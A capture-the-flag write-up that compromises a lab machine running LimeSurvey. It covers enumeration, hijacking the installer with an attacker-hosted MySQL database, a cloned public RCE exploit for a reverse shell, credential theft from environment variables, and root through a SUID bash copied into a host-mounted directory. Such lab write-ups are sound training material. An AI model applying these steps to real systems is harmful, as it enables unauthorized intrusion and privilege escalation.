# Forgotten writeup

## 1 Nmap
 $ sudo nmap -p- -sC -sV --min-rate 1000 10.129.234.81
  -> http, ssh is open

## 2 User flag
 visit port 80 via browser, website is working on the target machine.
 $ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.129.234.81
 ->find /survey, so visit there
 
 limesurvey installer is working and we can continue the installation process.
 we will set database, so setup MySQL on the attacker machine using "docker"
 $ sudo docker pull mysql
 $ sudo docker run -p 3306:3306 --rm --name tmp-mysql -e MYSQL_ROOT_PASSWORD=password mysql:latest
 -> docker container is running, we can verify that with the following command
 $ netstat -tanp | grep -i list
  t: tcp
  a: all
  n: don't resolve IP, port
  p: show the process ID
 also the following command show you that docker container is listening on 3306 port.
 $ ss -tlpn

 proceed the installation, specify IP address of attacker machine as "Database location"
 after installation is complete, we can log in to admin account and find the version of limesurvey "6.3.7+231127".

 google search the version of limesurvey and find CVE-2021-44967.
 $ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
 revise the shell and follow the instructions in the README, and you can get reverse shell.
 
 container)$ env
 we can get limesvc's password, so get into the target via ssh
 $ ssh limesvc@10.129.234.81

 [+] get user.txt [+]

## 3 Root flag
 container)$ sudo -l
 -> "(ALL : ALL) ALL" is in the output, this means we can run anything with sudo as limesvc
 target)$ sudo su
 we have root, but this is on the container and we cannot access to the root.txt now.

 container)$ findmnt -o TARGET,SOURCE,FSTYPE,PROPAGATION
 we find "/var/www/html/survey /dev/root[/opt/limesurvey]"
  -> a directory on the container "/var/www/html/survey" seems to be mounted to /opt/limesurvey on the host machine

 container)$ touch temp
 -> temp file is created on /var/www/html/survey
 look at /opt/limesurvey on the host machine, we can find temp file
 ssh)$ ls -lah /opt/limesurvey
 temp file on the host machine was written as "root"
 -> probably, we can execute /bin/bash as root!!
 container)$ sudo cp /bin/bash /var/www/html/survey/0xB1rd
 and set the suid, so we can run bash as root.
 container)$ chmod 6777 /var/www/html/survey/0xB1rd 

 ssh)$ ls -la /opt/limesurvey
 -> there is 0xB1rd, which is owned be root
 ssh)sudo ./0xB1rd -p
 -> we are root!
 [+] get root.txt!! [ +]
